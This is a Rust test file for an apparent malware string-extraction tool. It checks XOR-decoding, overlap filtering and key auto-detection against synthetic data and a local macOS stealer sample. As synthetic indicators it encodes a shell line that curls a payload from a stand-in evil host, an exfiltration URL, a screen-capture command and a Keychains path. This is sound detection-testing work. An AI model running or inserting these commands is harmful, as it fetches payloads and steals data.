#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
/// Test to ensure XOR extraction doesn't produce overlapping strings
///
/// When scanning for XOR strings, we should avoid extracting multiple
/// overlapping variations of the same region. This test ensures that
/// extracted strings have no byte-range overlaps.
use stng::{ExtractOptions, StringKind, StringMethod};

#[test]
fn test_no_overlapping_xor_strings() {
    // Create test data with XOR'd strings and null-padded regions
    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    // Simulate a region that could produce overlapping artifacts:
    // - Some real XOR'd strings
    // - Null-padded regions (which XOR to the key itself)
    let mut data = Vec::new();

    // Add a real string
    let real_string = "osascript -e 'tell application'";
    for (i, &b) in real_string.as_bytes().iter().enumerate() {
        data.push(b ^ key[i % key.len()]);
    }

    // Add some separator
    data.extend_from_slice(&[0xFF, 0xFE, 0xFD]);

    // Add a null-padded region (these can produce key artifacts at multiple offsets)
    // Pattern: 00 02 00 00 00 64 00 00 00 00 00 00...
    data.extend_from_slice(&[
        0x00, 0x02, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]);

    // Add another real string
    let real_string2 = "desktopFolder";
    for (i, &b) in real_string2.as_bytes().iter().enumerate() {
        data.push(b ^ key[i % key.len()]);
    }

    // Extract with XOR key
    let opts = ExtractOptions::new(10)
        .with_xor_key(key.to_vec())
        .with_garbage_filter(true);

    let extracted = stng::extract_strings_with_options(&data, &opts);

    // Get only XOR-decoded strings
    let xor_strings: Vec<_> = extracted
        .iter()
        .filter(|s| s.method == StringMethod::XorDecode)
        .collect();

    // Check for overlapping byte ranges with same content (bad overlaps)
    // Different strings can overlap in byte range if they have different content
    for (i, s1) in xor_strings.iter().enumerate() {
        let s1_start = s1.data_offset as usize;
        let s1_end = s1_start + s1.value.len();

        for (j, s2) in xor_strings.iter().enumerate() {
            if i == j {
                continue;
            }

            let s2_start = s2.data_offset as usize;
            let s2_end = s2_start + s2.value.len();

            // Check if ranges overlap
            let byte_overlap = !(s1_end <= s2_start || s1_start >= s2_end);

            // Only fail if they overlap AND one is substring of other (same content)
            if byte_overlap {
                let is_same_content = s1.value.contains(&s2.value) || s2.value.contains(&s1.value);
                assert!(
                    !is_same_content,
                    "Found overlapping XOR strings with same content:\n  [{:#x}-{:#x}] '{}'\n  [{:#x}-{:#x}] '{}'",
                    s1_start, s1_end, s1.value,
                    s2_start, s2_end, s2.value
                );
            }
        }
    }

    // Verify we still found the real strings (not filtered as artifacts)
    let values: Vec<_> = xor_strings.iter().map(|s| s.value.as_str()).collect();
    assert!(
        values.iter().any(|v| v.contains("osascript")),
        "Should find real XOR string 'osascript'. Found: {:?}",
        values
    );
    assert!(
        values.iter().any(|v| v.contains("desktopFolder")),
        "Should find real XOR string 'desktopFolder'. Found: {:?}",
        values
    );
}

#[test]
fn test_null_region_filtering() {
    // Test that we don't extract key artifacts from null-heavy regions
    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    // Create data that's mostly nulls with occasional non-null bytes
    // This pattern would XOR to something like: "f[ztZ+RL5VNS7nCUH1ktn5UoJ8VSgaffY"
    // (mostly the key, which is an artifact)
    let data = vec![
        0x00, 0x02, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];

    let opts = ExtractOptions::new(10)
        .with_xor_key(key.to_vec())
        .with_garbage_filter(true);

    let extracted = stng::extract_strings_with_options(&data, &opts);

    let xor_strings: Vec<_> = extracted
        .iter()
        .filter(|s| s.method == StringMethod::XorDecode)
        .collect();

    // Should NOT extract the key artifact from this null-heavy region
    assert_eq!(
        xor_strings.len(),
        0,
        "Should not extract key artifacts from null-heavy regions. Found: {:?}",
        xor_strings.iter().map(|s| &s.value).collect::<Vec<_>>()
    );
}

#[test]
fn test_brew_agent_no_overlaps() {
    // Test that the actual brew_agent malware doesn't produce overlaps
    let path = "/Users/t/data/dissect/malware/macho/2026.homabrews_org/brew_agent";

    // Skip if test file doesn't exist
    if !std::path::Path::new(path).exists() {
        eprintln!("Skipping test - brew_agent not found at {}", path);
        return;
    }

    let data = std::fs::read(path).expect("Failed to read brew_agent");
    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    let opts = ExtractOptions::new(10)
        .with_xor_key(key.to_vec())
        .with_garbage_filter(true);

    let extracted = stng::extract_strings_with_options(&data, &opts);

    let xor_strings: Vec<_> = extracted
        .iter()
        .filter(|s| s.method == StringMethod::XorDecode)
        .collect();

    println!("Found {} XOR strings in brew_agent", xor_strings.len());

    // Check for overlaps
    for (i, s1) in xor_strings.iter().enumerate() {
        let s1_start = s1.data_offset as usize;
        let s1_end = s1_start + s1.value.len();

        for (j, s2) in xor_strings.iter().enumerate() {
            if i == j {
                continue;
            }

            let s2_start = s2.data_offset as usize;
            let s2_end = s2_start + s2.value.len();

            let overlaps = !(s1_end <= s2_start || s1_start >= s2_end);

            assert!(
                !overlaps,
                "Found overlapping XOR strings in brew_agent:\n  [{:#x}-{:#x}] '{}'\n  [{:#x}-{:#x}] '{}'",
                s1_start, s1_end, s1.value,
                s2_start, s2_end, s2.value
            );
        }
    }

    // Verify key indicators are found
    let values: Vec<_> = xor_strings.iter().map(|s| s.value.as_str()).collect();
    let has_desktop_folder = values.iter().any(|v| v.contains("desktopFolder"));
    let has_telegram = values.iter().any(|v| v.to_lowercase().contains("telegram"));
    let has_wallet = values.iter().any(|v| v.to_lowercase().contains("wallet"));

    assert!(
        has_desktop_folder,
        "Should find 'desktopFolder' in brew_agent"
    );
    assert!(
        has_telegram || has_wallet,
        "Should find cryptocurrency/messaging indicators in brew_agent"
    );
}

#[test]
fn test_auto_detected_xor_key_in_output() {
    // Verify that when XOR auto-detection finds a key, the returned strings
    // include an entry with kind == XorKey. This regressed when the key string
    // existed at multiple offsets (e.g. fat Mach-O arch slices): only one copy
    // was marked XorKey, and value-dedup kept the unmarked copy instead.
    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    // Build synthetic data small enough for auto-detect (< 512 KB).
    // Layout:
    //   [random padding] [key as plaintext] [separator]
    //   [XOR-encoded IOCs to score above threshold]
    //   [more padding] [key again at different offset] [padding]
    let mut data = Vec::new();

    // Pad with non-null, non-printable bytes so raw scan doesn't pick them up
    data.resize(256, 0x80);

    // Embed the key as a null-terminated plaintext string (first copy)
    data.extend_from_slice(key);
    data.push(0x00);

    // Separator
    data.extend_from_slice(&[0xFF; 32]);

    // XOR-encode several high-value IOCs to exceed the 375 confidence threshold.
    // Each shell command scores 100, URLs score 50, suspicious paths score 75.
    let iocs: &[&[u8]] = &[
        b"osascript -e 'tell application \"Finder\"'", // +100 (shell)
        b"/bin/bash -c 'curl http://evil.example.com/payload'", // +100 (shell)
        b"screencapture -x /tmp/screen.png",           // +100 (shell)
        b"http://46.30.191.141/api/check",             // +50  (URL)
        b"https://evil.example.com/exfil",             // +50  (URL)
        b"/Users/victim/Library/Keychains",            // +75  (sus path)
    ];

    for ioc in iocs {
        // Non-printable separator so strings don't merge
        data.extend_from_slice(&[0xFF; 4]);
        // XOR-encode the IOC
        for (i, &b) in ioc.iter().enumerate() {
            data.push(b ^ key[i % key.len()]);
        }
    }

    // More padding
    data.extend_from_slice(&[0x80; 256]);

    // Embed the key a second time at a different offset (simulates fat binary)
    data.extend_from_slice(key);
    data.push(0x00);

    // Pad to end
    data.extend_from_slice(&[0x80; 256]);

    // Extract with auto-detection enabled (no explicit key)
    let opts = ExtractOptions::new(10)
        .with_xor(Some(10))
        .with_garbage_filter(true);

    let extracted = stng::extract_strings_with_options(&data, &opts);

    // The key must appear as XorKey in the output — this is what the header
    // display in main.rs searches for
    let xor_key_entry = extracted.iter().find(|s| s.kind == StringKind::XorKey);
    assert!(
        xor_key_entry.is_some(),
        "Auto-detected XOR key should appear with kind=XorKey in output. \
         Kinds present: {:?}",
        extracted
            .iter()
            .map(|s| format!(
                "{}:{:?}",
                s.value.chars().take(30).collect::<String>(),
                s.kind
            ))
            .collect::<Vec<_>>()
    );

    let xor_key_value = &xor_key_entry.unwrap().value;
    assert_eq!(
        xor_key_value,
        std::str::from_utf8(key).unwrap(),
        "XorKey entry should contain the detected key"
    );
}
